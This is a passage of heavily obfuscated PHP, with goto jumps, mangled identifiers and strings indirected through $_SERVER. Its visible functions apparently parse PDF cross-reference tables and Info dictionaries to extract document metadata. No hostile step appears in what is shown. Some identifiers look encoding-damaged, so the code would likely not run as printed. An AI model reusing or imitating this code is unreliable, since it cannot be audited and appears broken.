(!$A«–”¾´[$bÍ—äÁ®Œ´[1431]] && count($cë¯â„“) == 5) { $A«–”¾´[$bÍ—äÁ®Œ´[1431]] = $cë¯â„“[3]; $A«–”¾´[$bÍ—äÁ®Œ´[1433]] = $cë¯â„“[4]; } preg_match($bÍ—äÁ®Œ´[1434], $CÕ»·ˆŒ”[$bÍ—äÁ®Œ´[1428]], $cë¯â„“); goto fÕâù±ÙÙ½; cš¿‘·¢: if ($cë¯â„“[1] && $A«–”¾´[$bÍ—äÁ®Œ´[1435]] < $cë¯â„“[1][0]) { $A«–”¾´[$bÍ—äÁ®Œ´[1435]] = $cë¯â„“[1][0]; } $A«–”¾´ = self::parseInfoItem($A«–”¾´); return $A«–”¾´; goto f–Éİ•šá“; bŠ©‰¿±ñ: if ($d™Ü•Ì‘‚) { $DßæŒ£‡³“ = $d™Ü•Ì‘‚[$bÍ—äÁ®Œ´[1430]][$bÍ—äÁ®Œ´[1143]]; $A«–”¾´ = self::getObjectValue($CÕ»·ˆŒ”, $d™Ü•Ì‘‚, $DßæŒ£‡³“); } $A«–”¾´ = is_array($A«–”¾´) ? $A«–”¾´ : array(); $A«–”¾´[$bÍ—äÁ®Œ´[1431]] = 0; goto dÊ¯°‹±§; fÕâù±ÙÙ½: if ($cë¯â„“) { $A«–”¾´[$bÍ—äÁ®Œ´[1233]] = $cë¯â„“[1]; } $A«–”¾´[$bÍ—äÁ®Œ´[1435]] = 0; $f£Šßƒ—“Œ = $bÍ—äÁ®Œ´[1436]; goto Fñ´î‘ÜÂÑ; dÊ¯°‹±§: $f£Šßƒ—“Œ = $bÍ—äÁ®Œ´[1432]; preg_match($f£Šßƒ—“Œ, $CÕ»·ˆŒ”[$bÍ—äÁ®Œ´[1428]], $cë¯â„“); if (!$A«–”¾´[$bÍ—äÁ®Œ´[1431]] && count($cë¯â„“) == 5) { $A«–”¾´[$bÍ—äÁ®Œ´[1431]] = $cë¯â„“[3]; $A«–”¾´[$bÍ—äÁ®Œ´[1433]] = $cë¯â„“[4]; } goto b¹Òºƒ“Ãî; Fñ´î‘ÜÂÑ: preg_match_all($f£Šßƒ—“Œ, $CÕ»·ˆŒ”[$bÍ—äÁ®Œ´[1428]], $cë¯â„“); if ($cë¯â„“[1] && $A«–”¾´[$bÍ—äÁ®Œ´[1435]] < $cë¯â„“[1][0]) { $A«–”¾´[$bÍ—äÁ®Œ´[1435]] = $cë¯â„“[1][0]; } preg_match_all($f£Šßƒ—“Œ, $CÕ»·ˆŒ”[$bÍ—äÁ®Œ´[1429]], $cë¯â„“); goto cš¿‘·¢; eŞËªñ‚: $CÕ»·ˆŒ”[$bÍ—äÁ®Œ´[1428]] = StreamWrapperIO::read($Aê‡­•Æ¹£, 0, $FĞôŠëôÅ±); $CÕ»·ˆŒ”[$bÍ—äÁ®Œ´[1429]] = StreamWrapperIO::read($Aê‡­•Æ¹£, $CÕ»·ˆŒ”[$bÍ—äÁ®Œ´[78]] - $FĞôŠëôÅ±, $FĞôŠëôÅ±); $d™Ü•Ì‘‚ = self::decodeXref($CÕ»·ˆŒ”); goto bŠ©‰¿±ñ; D¬™¹†êÀ: $bÍ—äÁ®Œ´ =& $_SERVER[‘®…¢À]; $FĞôŠëôÅ± = 32 * 1024; $CÕ»·ˆŒ” = array($bÍ—äÁ®Œ´[757] => fopen($Aê‡­•Æ¹£, $bÍ—äÁ®Œ´[1120]), $bÍ—äÁ®Œ´[76] => $Aê‡­•Æ¹£, $bÍ—äÁ®Œ´[78] => filesize($Aê‡­•Æ¹£), $bÍ—äÁ®Œ´[1427] => $FĞôŠëôÅ±); goto eŞËªñ‚; f–Éİ•šá“: } private static function parseInfoItem($BÔ„”øğğà) { $bõôºæ›õõ =& $_SERVER[‘®…¢À]; if (!$BÔ„”øğğà) { return !1; } $C¯…Ãœ… = array($bõôºæ›õõ[1234] => array($bõôºæ›õõ[1437], $bõôºæ›õõ[33]), $bõôºæ›õõ[1438] => array($bõôºæ›õõ[1439], $bõôºæ›õõ[33]), $bõôºæ›õõ[184] => array($bõôºæ›õõ[1440], $bõôºæ›õõ[207]), $bõôºæ›õõ[108] => array($bõôºæ›õõ[1441], $bõôºæ›õõ[207]), $bõôºæ›õõ[1435] => array($bõôºæ›õõ[1435], $bõôºæ›õõ[273]), $bõôºæ›õõ[1431] => array($bõôºæ›õõ[1431], $bõôºæ›õõ[273]), $bõôºæ›õõ[1433] => array($bõôºæ›õõ[1433], $bõôºæ›õõ[273]), $bõôºæ›õõ[1442] => array($bõôºæ›õõ[1443], $bõôºæ›õõ[33]), $bõôºæ›õõ[1444] => array($bõôºæ›õõ[1445], $bõôºæ›õõ[33]), $bõôºæ›õõ[1446] => array($bõôºæ›õõ[1233], $bõôºæ›õõ[33])); $e‘š³¸Êœ½ = array(); foreach ($C¯…Ãœ… as $fÇÉí¸ğÄé => $EÌ—ĞÄ´’Ï) { if (!isset($BÔ„”øğğà[$EÌ—ĞÄ´’Ï[0]])) { continue; } $eÈáÌ‹š» = $BÔ„”øğğà[$EÌ—ĞÄ´’Ï[0]]; if (!$eÈáÌ‹š» || is_array($eÈáÌ‹š»)) { continue; } switch ($EÌ—ĞÄ´’Ï[1]) { case $bõôºæ›õõ[273]: $eÈáÌ‹š» = intval($eÈáÌ‹š»); break; case $bõôºæ›õõ[207]: if (substr($eÈáÌ‹š», 0, 2) == $bõôºæ›õõ[1447]) { $eÈáÌ‹š» = substr($eÈáÌ‹š», 2, 14); } if (strtotime($eÈáÌ‹š»)) { $eÈáÌ‹š» = date($bõôºæ›õõ[1448], strtotime($eÈáÌ‹š»)); } break; } $e‘š³¸Êœ½[$fÇÉí¸ğÄé] = $eÈáÌ‹š»; } return $e‘š³¸Êœ½; } private static function decodeXref(&$cŞ¹ÚõÜº­) { goto a¡÷ÙâÉŒ; eŠë¯½ÒŒÅ: $aÔ…Óñ‹Ê = $d„Š«’ÜñÇ[1450]; if (!preg_match_all($aÔ…Óñ‹Ê, $EÍÊ´ƒäšò, $DÈÚ¹Éô¦î, PREG_SET_ORDER, 0)) { return !1; } $bò½Ú¬·¡ = intval($DÈÚ¹Éô¦î[0][1]); goto EñÃĞ®’Á; EñÃĞ®’Á: if ($cŞ¹ÚõÜº­[$d„Š«’ÜñÇ[78]] - $bò½Ú¬·¡ > $cŞ¹ÚõÜº­[$d„Š«’ÜñÇ[1427]]) { $b¨øµëïÅ¯ = 4 * $cŞ¹ÚõÜº­[$d„Š«’ÜñÇ[1427]]; $cŞ¹ÚõÜº­[$d„Š«’ÜñÇ[1427]] = $b¨øµëïÅ¯; $cŞ¹ÚõÜº­[$d„Š«’ÜñÇ[1428]] = StreamWrapperIO::read($cŞ¹ÚõÜº­[$d„Š«’ÜñÇ[76]], 0, $b¨øµëïÅ¯); $cŞ¹ÚõÜº­[$d„Š«’ÜñÇ[1429]] = StreamWrapperIO::read($cŞ¹ÚõÜº­[$d„Š«’ÜñÇ[76]], $cŞ¹ÚõÜº­[$d„Š«’ÜñÇ[78]] - $b¨øµëïÅ¯, $b¨øµëïÅ¯); $EÍÊ´ƒäšò = $cŞ¹ÚõÜº­[$d„Š«’ÜñÇ[1429]]; } $FŠŒˆ‘ãó± = 0; preg_match_all($d„Š«’ÜñÇ[1451], $EÍÊ´ƒäšò, $DÈÚ¹Éô¦î); goto Cê…ÉªÇñ“; Dø‡ÀÆÒÃÑ: if (preg_match($d„Š«’ÜñÇ[1456], $Bæ®‚ç¢ÓŞ, $DÈÚ¹Éô¦î) > 0) { $d¸±æ„ª×Ÿ[$d„Š«’ÜñÇ[1430]][$d„Š«’ÜñÇ[78]] = intval($DÈÚ¹Éô¦î[1]); } if (preg_match($d„Š«’ÜñÇ[1457], $Bæ®‚ç¢ÓŞ, $DÈÚ¹Éô¦î) > 0) { $d¸±æ„ª×Ÿ[$d„Š«’ÜñÇ[1430]][$d„Š«’ÜñÇ[1458]] = intval($DÈÚ¹Éô¦î[1]) . $d„Š«’ÜñÇ[71] . intval($DÈÚ¹Éô¦î[2]); } if (preg_match($d„Š«’ÜñÇ[1459], $Bæ®‚ç¢ÓŞ, $DÈÚ¹Éô¦î) > 0) { $d¸±æ„ª×Ÿ[$d„Š«’ÜñÇ[1430]][$d„Š«’ÜñÇ[1460]] = intval($DÈÚ¹Éô¦î[1]) . $d„Š«’ÜñÇ[71] . intval($DÈÚ¹Éô¦î[2]); } goto C±¬íŞŠó°; Cê…ÉªÇñ“: foreach ($DÈÚ¹Éô¦î[3] as $Aà¦÷ºƒ => $a‹¾ŸŠÈÊ‹) { if ($DÈÚ¹Éô¦î[3][$Aà¦÷ºƒ] == $d„Š«’ÜñÇ[1452]) { $dÍ¡ì·Š• = $FŠŒˆ‘ãó± . $d„Š«’ÜñÇ[71] . intval($DÈÚ¹Éô¦î[2][$Aà¦÷ºƒ]); $d¸±æ„ª×Ÿ[$d„Š«’ÜñÇ[1449]][$dÍ¡ì·Š•] = intval($DÈÚ¹Éô¦î[1][$Aà¦÷ºƒ]); ++$FŠŒˆ‘ãó±; } else { if ($DÈÚ¹Éô¦î[3][$Aà¦÷ºƒ] == $d„Š«’ÜñÇ[1453]) { ++$FŠŒˆ‘ãó±; } else { } } } if (preg_match_all($d„Š«’ÜñÇ[1454], $EÍÊ´ƒäšò, $DÈÚ¹Éô¦î)) { $d©°×¯…Òƒ = $cŞ¹ÚõÜº­[$d„Š«’ÜñÇ[78]] - $cŞ¹ÚõÜº­[$d„Š«’ÜñÇ[1427]]; foreach ($DÈÚ¹Éô¦î[0] as $Aà¦÷ºƒ => $C’®·°Ÿ¨¦) { $c¨†±Œª = $DÈÚ¹Éô¦î[1][$Aà¦÷ºƒ] . $d„Š«’ÜñÇ[71] . $DÈÚ¹Éô¦î[2][$Aà¦÷ºƒ]; $d¸±æ„ª×Ÿ[$d„Š«’ÜñÇ[1449]][$c¨†±Œª] = strpos($EÍÊ´ƒäšò, $C’®·°Ÿ¨¦) + $d©°×¯…Òƒ + 1; } } if (preg_match_all($d„Š«’ÜñÇ[1455], $EÍÊ´ƒäšò, $DÈÚ¹Éô¦î)) { $Bæ®‚ç¢ÓŞ = count($DÈÚ¹Éô¦î[1]) == 1 ? $DÈÚ¹Éô¦î[1][0] : $DÈÚ¹Éô¦î[1][1]; } else { $Bæ®‚ç¢ÓŞ = substr($EÍÊ´ƒäšò, -1024 * 5); } goto Dø‡ÀÆÒÃÑ; a¡÷ÙâÉŒ: $d„Š«’ÜñÇ =& $_SERVER[‘®…¢À]; $EÍÊ´ƒäšò = $cŞ¹ÚõÜº­[$d„Š«’ÜñÇ[1429]]; $d¸±æ„ª×Ÿ = array($d„Š«’ÜñÇ[1430] => array(), $d„Š«’ÜñÇ[1449] => array()); goto eŠë¯½ÒŒÅ; C±¬íŞŠó°: if (preg_match($d„Š«’ÜñÇ[1461], $Bæ®‚ç¢ÓŞ, $DÈÚ¹Éô¦î) > 0) { $d¸±æ„ª×Ÿ[$d„Š«’ÜñÇ[1430]][$d„Š«’ÜñÇ[1143]] = intval($DÈÚ¹Éô¦î[1]) . $d„Š«’ÜñÇ[71] . intval($DÈÚ¹Éô¦î[2]); } if (preg_match($d„Š«’ÜñÇ[1462], $Bæ®‚ç¢ÓŞ, $DÈÚ¹Éô¦î) > 0) { $d¸±æ„ª×Ÿ[$d„Š«’ÜñÇ[1430]][$d„Š«’ÜñÇ[363]] = array(); $d¸±æ„ª×Ÿ[$d„Š«’ÜñÇ[1430]][$d„Š«’ÜñÇ[363]][0] = $DÈÚ¹Éô¦î[1]; $d¸±æ„ª×Ÿ[$d„Š«’ÜñÇ[1430]][$d„Š«’ÜñÇ[363]][1] = $DÈÚ¹Éô¦î[2]; } if (!$d¸±æ„ª×Ÿ[$d„Š«’ÜñÇ[1430]][$d„Š«’ÜñÇ[1143]]) { return !1; } goto f¤ÊòÚÙ»–; f¤ÊòÚÙ»–: if (preg_match($d„Š«’ÜñÇ[1463], $Bæ®‚ç¢ÓŞ, $DÈÚ¹Éô¦î) > 0) { } return $d¸±æ„ª×Ÿ; goto B´óŠÒ·; B´óŠÒ·: } private static function getObjectValue($bëÒÀœ©œÏ, $Dßæ¿Ş×°, $A”òé«à·) { goto c³éÊ´•Š; c³éÊ´•Š: $fèÎÆğ¨¨ˆ =& $_SERVER[‘®…¢À]; $C£…Ú˜šÇÄ = self::getObject($bëÒÀœ©œÏ, $Dßæ¿Ş×°[$fèÎÆğ¨¨ˆ[1449]][$A”òé«à·]); if (is_string($C£…Ú˜šÇÄ[1])) { return $C£…Ú˜šÇÄ[1]; } goto bŸ¦Òîãã­; bŸ¦Òîãã­: if (!is_array($C£…Ú˜šÇÄ[1])) { return array(); } $eêì«Ş‘ìÅ = array(); for ($fŠˆ•½¨ Ê = 0; $fŠˆ•½¨ Ê < count($C£…Ú˜šÇÄ[1]); $fŠˆ•½¨ Ê += 2) { $Aƒà—‡¨‹ = $C£…Ú˜šÇÄ[1][$fŠˆ•½¨ Ê]; $Eë×…’ˆÉ® = $C£…Ú˜šÇÄ[1][$fŠˆ•½¨ Ê + 1]; if (count($Aƒà—‡¨‹) == 3 && $Aƒà—‡¨‹[0] == $fèÎÆğ¨¨ˆ[8]) { $aˆğØÖÒÒ¬ = !1; if ($Eë×…’ˆÉ®[0] == $fèÎÆğ¨¨ˆ[1464]) { $Eë×…’ˆÉ® = self::getObject($bëÒÀœ©œÏ, $Dßæ¿Ş×°[$fèÎÆğ¨¨ˆ[1449]][$Eë×…’ˆÉ®[1]]); } $aˆğØÖÒÒ¬ = $Eë×…’ˆÉ®[1]; if ($aˆğØÖÒÒ¬ === !1) { continue; } if (is_string($aˆğØÖÒÒ¬)) { $aˆğØÖÒÒ¬ = self::decodeStr($aˆğØÖÒÒ¬); } $eêì«Ş‘ìÅ[$Aƒà—‡¨‹[1]] = $aˆğØÖÒÒ¬; } } goto cÃ‡Âé¤×; cÃ‡Âé¤×: return $eêì«Ş‘ìÅ; goto Dç•‘š…ä; Dç•‘š…ä: } private static function getObject($dÂµ’’§ªò, $DŞáË¹Ì) { $a‹ò–ÍÊøÛ = self::getObjectItem($dÂµ’’§ªò, $DŞáË¹Ì); $a‹ò–ÍÊøÛ = self::getObjectItem($dÂµ’’§ªò, $a‹ò–ÍÊøÛ[2]); return $a‹ò–ÍÊøÛ; } private static function getObjectItem($C‡æ×Ğ™İ, $fá¥Ğ™•‘) { goto Bğ¾ïÏ‘æ„; B±›„Ú¥³: $f¶Ë‹æÃ¾³ = self::getRawObject($dØğ™“‚É, $e¿ÉÄšÀÒ); if ($fá¥Ğ™•‘ >= $B¡ÊÃÛ™›) { $f¶Ë‹æÃ¾³[2] = $f¶Ë‹æÃ¾³[2] + $B¡ÊÃÛ™›; } else { if ($fá¥Ğ™•‘ > $fİñìàÑ¾Æ && $fá¥Ğ™•‘ <= $B¡ÊÃÛ™›) { $f¶Ë‹æÃ¾³[2] = $f¶Ë‹æÃ¾³[2] + $fá¥Ğ™•‘; } } return $f¶Ë‹æÃ¾³; goto B†ëËôÆ†š; Bğ¾ïÏ‘æ„: $cŒØ¤’‡Ê =& $_SERVER[‘®…¢À]; $fİñìàÑ¾Æ = $C‡æ×Ğ™İ[$cŒØ¤’‡Ê[1427]]; $B¡ÊÃÛ™› = $C‡æ×Ğ™İ[$cŒØ¤’‡Ê[78]] - $fİñìàÑ¾Æ; goto e¯Ÿõ‡øò•; e¯Ÿõ‡øò•: $e¿ÉÄšÀÒ = $fá¥Ğ™•‘ >= $B¡ÊÃÛ™› ? $fá¥Ğ™•‘ - $B¡ÊÃÛ™› : $fá¥Ğ™•‘; $dØğ™“‚É = $fá¥Ğ™•‘ >= $B¡ÊÃÛ™› ? $C‡æ×Ğ™İ[$cŒØ¤’‡Ê[1429]] : $C‡æ×Ğ™İ[$cŒØ¤’‡Ê[1428]]; if ($fá¥Ğ™•‘ > $fİñìàÑ¾Æ && $fá¥Ğ™•‘ <= $B¡ÊÃÛ™›) { $e¿ÉÄšÀÒ = 0; $dØğ™“‚É = StreamWrapperIO::read($C‡æ×Ğ™İ[$cŒØ¤’‡Ê[76]], $fá¥Ğ™•‘, $fİñìàÑ¾Æ); } goto B±›„Ú¥³; B†ëËôÆ†š: } private static function decodeStr($f‘ã¾îµ¢Ì) { goto A¦íšŸô‡†; A¦íšŸô‡†: $CÃİ“ƒİÊÖ =& $_SERVER[‘®…¢À]; $f‘ã¾îµ¢Ì = str_replace(array($CÃİ“ƒİÊÖ[1465], $CÃİ“ƒİÊÖ[1466], $CÃİ“ƒİÊÖ[1467], $CÃİ“ƒİÊÖ[1468], $CÃİ“ƒİÊÖ[1469], $CÃİ“ƒİÊÖ[1470], $CÃİ“ƒİÊÖ[1471], $CÃİ“ƒİÊÖ[1472]), array($CÃİ“ƒİÊÖ[96], $CÃİ“ƒİÊÖ[50], $CÃİ“ƒİÊÖ[8], $CÃİ“ƒİÊÖ[245], $CÃİ“ƒİÊÖ[797], $CÃİ“ƒİÊÖ[214], $CÃİ“ƒİÊÖ[702], $CÃİ“ƒİÊÖ[327]), $f‘ã¾îµ¢Ì); $FÂ—£ËÕª = preg_split($CÃİ“ƒİÊÖ[1473], $f‘ã¾îµ¢Ì, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto E¥â‘ÁìŠÊ; E¼Í­âàÑ: $f‘ã¾îµ¢Ì = $CÃİ“ƒİÊÖ[33]; foreach ($FÂ—£ËÕª as $F¸¹›¡Ş³) { if (preg_match($CÃİ“ƒİÊÖ[1479], $F¸¹›¡Ş³) && !1 === stripos($F¸¹›¡Ş³, $CÃİ“ƒİÊÖ[1480])) { $F¸¹›¡Ş³ = preg_replace($CÃİ“ƒİÊÖ[1481], $CÃİ“ƒİÊÖ[33], $F¸¹›¡Ş³); $F¸¹›¡Ş³ = trim($F¸¹›¡Ş³, $CÃİ“ƒİÊÖ[907]); $F¸¹›¡Ş³ = pack($CÃİ“ƒİÊÖ[1482], $F¸¹›¡Ş³); $f‘ã¾îµ¢Ì .= $F¸¹›¡Ş³; } else { $f‘ã¾îµ¢Ì .= $F¸¹›¡Ş³; } } if (preg_match($CÃİ“ƒİÊÖ[1483], $f‘ã¾îµ¢Ì)) { $AÌù«´÷Â = substr($f‘ã¾îµ¢Ì, 2); $f‘ã¾îµ¢Ì = $CÃİ“ƒİÊÖ[33]; $bÉµá…›ğ = strlen($AÌù«´÷Â); for ($fÅáÔÛ§Ñ = 0; $fÅáÔÛ§Ñ < $bÉµá…›ğ; $fÅáÔÛ§Ñ += 2) { $E™ê„…¶ƒ¼ = hexdec(bin2hex(substr($AÌù«´÷Â, $fÅáÔÛ§Ñ, 2))); $f‘ã¾îµ¢Ì .= mb_convert_encoding($CÃİ“ƒİÊÖ[1484] . intval($E™ê„…¶ƒ¼) . $CÃİ“ƒİÊÖ[68], $CÃİ“ƒİÊÖ[1485], $CÃİ“ƒİÊÖ[1486]); } } goto eËÌ‚¥ÕÚ‰; E¥â‘ÁìŠÊ: $f‘ã¾îµ¢Ì = $CÃİ“ƒİÊÖ[33]; foreach ($FÂ—£ËÕª as $F¸¹›¡Ş³) { if (preg_match($CÃİ“ƒİÊÖ[1474], $F¸¹›¡Ş³)) { $f‘ã¾îµ¢Ì .= \chr(octdec(trim($F¸¹›¡Ş³, $CÃİ“ƒİÊÖ[96]))); } else { $f‘ã¾îµ¢Ì .= $F¸¹›¡Ş³; } } $FÂ—£ËÕª = preg_split($CÃİ“ƒİÊÖ[1475], $f‘ã¾îµ¢Ì, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto A³åŠêˆ¢£; eËÌ‚¥ÕÚ‰: return $f‘ã¾îµ¢Ì; goto F£ÈÅóƒÛ²; A³åŠêˆ¢£: $f‘ã¾îµ¢Ì = $CÃİ“ƒİÊÖ[33]; foreach ($FÂ—£ËÕª as $F¸¹›¡Ş³) { if (preg_match($CÃİ“ƒİÊÖ[1476], $F¸¹›¡Ş³)) { $f‘ã¾îµ¢Ì .= \chr(hexdec(trim($F¸¹›¡Ş³, $CÃİ“ƒİÊÖ[1477]))); } else { $f‘ã¾îµ¢Ì .= $F¸¹›¡Ş³; } } $FÂ—£ËÕª = preg_split($CÃİ“ƒİÊÖ[1478], $f‘ã¾îµ¢Ì, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto E¼Í­âàÑ; F£ÈÅóƒÛ²: } private static function getRawObject($aò¢Ø²—ºÆ, $Dœå±÷Íºò = 0) { goto fõ¨‡Ó‘; fõ¨‡Ó‘: $d·ìÇ¥§Õİ =& $_SERVER[‘®…¢À]; $a’Ñ‘½–‚ö = $d·ìÇ¥§Õİ[33]; $FÔ‚ù“—×† = $d·ìÇ¥§Õİ[33]; goto D„“Ÿ¡Ã¦á; a¦¢èç»È: return array($a’Ñ‘½–‚ö, $FÔ‚ù“—×†, $Dœå±÷Íºò); goto cõ°Ñä‡ÁÕ; D„“Ÿ¡Ã¦á: $Dœå±÷Íºò += strspn($aò¢Ø²—ºÆ, $d·ìÇ¥§Õİ[1487], $Dœå±÷Íºò); $e‚„óö‚å = $aò¢Ø²—ºÆ[$Dœå±÷Íºò]; switch ($e‚„óö‚å) { case $d·ìÇ¥§Õİ[1488]: $DÅè–Å¬Š = strcspn($aò¢Ø²—ºÆ, $d·ìÇ¥§Õİ[1489], $Dœå±÷Íºò); if ($DÅè–Å¬Š > 0) { $Dœå±÷Íºò += $DÅè–Å¬Š; return self::getRawObject($aò¢Ø²—ºÆ, $Dœå±÷Íºò); } break; case $d·ìÇ¥§Õİ[8]: $a’Ñ‘½–‚ö = $e‚„óö‚å; ++$Dœå±÷Íºò; $cÄ°Ìè½Ÿ = preg_match($d·ìÇ¥§Õİ[1490], substr($aò¢Ø²—ºÆ, $Dœå±÷Íºò, 256), $b˜‰¡¨ÄŒ¨); if (1 == $cÄ°Ìè½Ÿ) { $FÔ‚ù“—×† = $b˜‰¡¨ÄŒ¨[1]; $Dœå±÷Íºò += strlen($FÔ‚ù“—×†); } break; case $d·ìÇ¥§Õİ[245]: case $d·ìÇ¥§Õİ[797]: $a’Ñ‘½–‚ö = $e‚„óö‚å; ++$Dœå±÷Íºò; $Aæ‰¼ŸÊ† = $Dœå±÷Íºò; if ($d·ìÇ¥§Õİ[245] == $e‚„óö‚å) { $Aä°³­¸Ô‹ = 1; while ($Aä°³­¸Ô‹ > 0) { if (!isset($aò¢Ø²—ºÆ[$Aæ‰¼ŸÊ†])) { break; } $eƒÌ…ŒÃÇÜ = $aò¢Ø²—ºÆ[$Aæ‰¼ŸÊ†]; switch ($eƒÌ…ŒÃÇÜ) { case $d·ìÇ¥§Õİ[96]: ++$Aæ‰¼ŸÊ†; break; case $d·ìÇ¥§Õİ[245]: ++$Aä°³­¸Ô‹; break; case $d·ìÇ¥§Õİ[797]: --$Aä°³­¸Ô‹; break; } ++$Aæ‰¼ŸÊ†; } $FÔ‚ù“—×† = substr($aò¢Ø²—ºÆ, $Dœå±÷Íºò, $Aæ‰¼ŸÊ† - $Dœå±÷Íºò - 1); $Dœå±÷Íºò = $Aæ‰¼ŸÊ†; } break; case $d·ìÇ¥§Õİ[154]: case $d·ìÇ¥§Õİ[467]: $a’Ñ‘½–‚ö = $e‚„óö‚å; ++$Dœå±÷Íºò; if ($d·ìÇ¥§Õİ[154] == $e‚„óö‚å) { $FÔ‚ù“—×† = array(); do { $d®Ÿ«÷áğ = $Dœå±÷Íºò; $fƒ³««³å = self::getRawObject($aò¢Ø²—ºÆ, $Dœå±÷Íºò); $Dœå±÷Íºò = $fƒ³««³å[2]; $FÔ‚ù“—×†[] = $fƒ³««³å; } while ($d·ìÇ¥§Õİ[467] != $fƒ³««³å[0] && $Dœå±÷Íºò != $d®Ÿ«÷áğ); array_pop($FÔ‚ù“—×†); } break; case $d·ìÇ¥§Õİ[906]: case $d·ìÇ¥§Õİ[909]: if (isset($aò¢Ø²—ºÆ[$Dœå±÷Íºò + 1]) && $aò¢Ø²—ºÆ[$Dœå±÷Íºò + 1] == $e‚„óö‚å) { $a’Ñ‘½–‚ö = $e‚„óö‚å . $e‚„óö‚å; $Dœå±÷Íºò += 2; if ($d·ìÇ¥§Õİ[906] == $e‚„óö‚å) { $FÔ‚ù“—×† = array(); do { $d®Ÿ«÷áğ = $Dœå±÷Íºò; $fƒ³««³å = self::getRawObject($aò¢Ø²—ºÆ, $Dœå±÷Íºò); $Dœå±÷Íºò = $fƒ³««³å[2]; $FÔ‚ù“—×†[] = $fƒ³««³å; } while ($d·ìÇ¥§Õİ[1491] != $fƒ³««³å[0] && $Dœå±÷Íºò != $d®Ÿ«÷áğ); array_pop($FÔ‚ù“—×†); } } else { $a’Ñ‘½–‚ö = $e‚„óö‚å; ++$Dœå±÷Íºò; $cÄ°Ìè½Ÿ = preg_match($d·ìÇ¥§Õİ[1492], substr($aò¢Ø²—ºÆ, $Dœå±÷Íºò), $b˜‰¡¨ÄŒ¨); if ($d·ìÇ¥§Õİ[906] == $e‚„óö‚å && 1 == $cÄ°Ìè½Ÿ) { $FÔ‚ù“—×† = strtr($b˜‰¡¨ÄŒ¨[1], $d·ìÇ¥§Õİ[1493], $d·ìÇ¥§Õİ[33]); $Dœå±÷Íºò += \strlen($b˜‰¡¨ÄŒ¨[0]); } elseif (!1 !== ($d¼ˆ‡ñ¸×ê = strpos($aò¢Ø²—ºÆ, $d·ìÇ¥§Õİ[909], $Dœå±÷Íºò))) { $Dœå±÷Íºò = $d¼ˆ‡ñ¸×ê + 1; } } break; default: if ($d·ìÇ¥§Õİ[1494] == substr($aò¢Ø²—ºÆ, $Dœå±÷Íºò, 6)) { $a’Ñ‘½–‚ö = $d·ìÇ¥§Õİ[1494]; $Dœå±÷Íºò += 6; } elseif ($d·ìÇ¥§Õİ[102] == substr($aò¢Ø²—ºÆ, $Dœå±÷Íºò, 4)) { $a’Ñ‘½–‚ö = $d·ìÇ¥§Õİ[102]; $Dœå±÷Íºò += 4; $FÔ‚ù“—×† = $d·ìÇ¥§Õİ[102]; } elseif ($d·ìÇ¥§Õİ[1495] == substr($aò¢Ø²—ºÆ, $Dœå±÷Íºò, 4)) { $a’Ñ‘½–‚ö = $d·ìÇ¥§Õİ[1496]; $Dœå±÷Íºò += 4; $FÔ‚ù“—×† = $d·ìÇ¥§Õİ[1495]; } elseif ($d·ìÇ¥§Õİ[1497] == substr($aò¢Ø²—ºÆ, $Dœå±÷Íºò, 5)) { $a’Ñ‘½–‚ö = $d·ìÇ¥§Õİ[1496]; $Dœå±÷Íºò += 5; $FÔ‚ù“—×† = $d·ìÇ¥§Õİ[1497]; } elseif ($d·ìÇ¥§Õİ[982] == substr($aò¢Ø²—ºÆ, $Dœå±÷Íºò, 6)) { $a’Ñ‘½–‚ö = $d·ìÇ¥§Õİ[982]; $Dœå±÷Íºò += 6; if (1 == preg_match($d·ìÇ¥§Õİ[1498], substr($aò¢Ø²—ºÆ, $Dœå±÷Íºò), $b˜‰¡¨ÄŒ¨)) { $Dœå±÷Íºò += strlen($b˜‰¡¨ÄŒ¨[0]); $CÊ¾İ–éÄ’ = $d·ìÇ¥§Õİ[1499]; $cÄ°Ìè½Ÿ = preg_match($CÊ¾İ–éÄ’, substr($aò¢Ø²—ºÆ, $Dœå±÷Íºò), $b˜‰¡¨ÄŒ¨, PREG_OFFSET_CAPTURE); if (1 == $cÄ°Ìè½Ÿ) { $FÔ‚ù“—×† = substr($aò¢Ø²—ºÆ, $Dœå±÷Íºò, $b˜‰¡¨ÄŒ¨[0][1]); $Dœå±÷Íºò += $b˜‰¡¨ÄŒ¨[1][1]; } } } elseif ($d·ìÇ¥§Õİ[1500] == substr($aò¢Ø²—ºÆ, $Dœå±÷Íºò, 9)) { $a’Ñ‘½–‚ö = $d·ìÇ¥§Õİ[1500]; $Dœå±÷Íºò += 9; } elseif (1 == preg_match($d·ìÇ¥§Õİ[1501], substr($aò¢Ø²—ºÆ, $Dœå±÷Íºò, 33), $b˜‰¡¨ÄŒ¨)) { $a’Ñ‘½–‚ö = $d·ìÇ¥§Õİ[1464]; $Dœå±÷Íºò += strlen($b˜‰¡¨ÄŒ¨[0]); $FÔ‚ù“—×† = intval($b˜‰¡¨ÄŒ¨[1]) . $d·ìÇ¥§Õİ[71] . intval($b˜‰¡¨ÄŒ¨[2]); } elseif (1 == preg_match($d·ìÇ¥§Õİ[1502], substr($aò¢Ø²—ºÆ, $Dœå±÷Íºò, 33), $b˜‰¡¨ÄŒ¨)) { $a’Ñ‘½–‚ö = $d·ìÇ¥§Õİ[1503]; $FÔ‚ù“—×† = intval($b˜‰¡¨ÄŒ¨[1]) . $d·ìÇ¥§Õİ[71] . intval($b˜‰¡¨ÄŒ¨[2]); $Dœå±÷Íºò += strlen($b˜‰¡¨ÄŒ¨[0]); } elseif (($Eˆåô™‰„ = strspn($aò¢Ø²—ºÆ, $d·ìÇ¥§Õİ[1504], $Dœå±÷Íºò)) > 0) { $a’Ñ‘½–‚ö = $d·ìÇ¥§Õİ[1505]; $FÔ‚ù“—×† = substr($aò¢Ø²—ºÆ, $Dœå±÷Íºò, $Eˆåô™‰„); $Dœå±÷Íºò += $Eˆåô™‰„; } break; } goto a¦¢èç»È; cõ°Ñä‡ÁÕ: } } class GetInfo { private static $fileTypeArray; public static function get($döëÉë”¤ô) { $bé¯¼¤ä = IO::info($döëÉë”¤ô); return self::infoAdd($bé¯¼¤ä); } public static function infoAdd(&$EèÂ‡İ·) { goto DÄËÙ±¿; FÆˆ‹‘Õèº: if (!$EèÂ‡İ· || $EèÂ‡İ·[$Bä˜Ô‡‰ËÒ[29]] != $Bä˜Ô‡‰ËÒ[164]) { return; } if 